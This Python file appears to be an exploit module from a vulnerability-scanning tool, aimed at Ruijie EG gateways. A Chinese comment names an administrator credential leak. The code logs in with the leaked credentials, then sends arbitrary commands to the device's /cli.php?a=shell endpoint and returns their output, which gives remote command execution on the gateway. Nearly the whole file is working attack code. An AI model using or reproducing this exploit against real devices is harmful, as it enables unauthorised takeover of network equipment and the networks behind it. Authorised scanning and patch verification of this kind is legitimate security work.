# -*- coding:utf-8 -*-
# 锐捷EG易网关 管理员账号密码泄露
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .. import requestUtil
from .ruijie_admin_poc import POC
from ..requestClass import Requests

session = requestUtil.session()

class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def login(self, url, username, password):
        resp = requestUtil.post(url + "/login.php", data=f"username={username}&password={password}", session=session)
        return True


    def rce(self, url, cmd):
        resp = requestUtil.post(url + "/cli.php?a=shell", data=f"notdelay=true&command={cmd}", session=session).json()
        return ("\n".join(resp["data"]))


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        [username, password] = self.vuln.specify.split("[psw]")
        self.login(self.vuln.url, username, password)
        return self.rce(self.vuln.url, cmd)
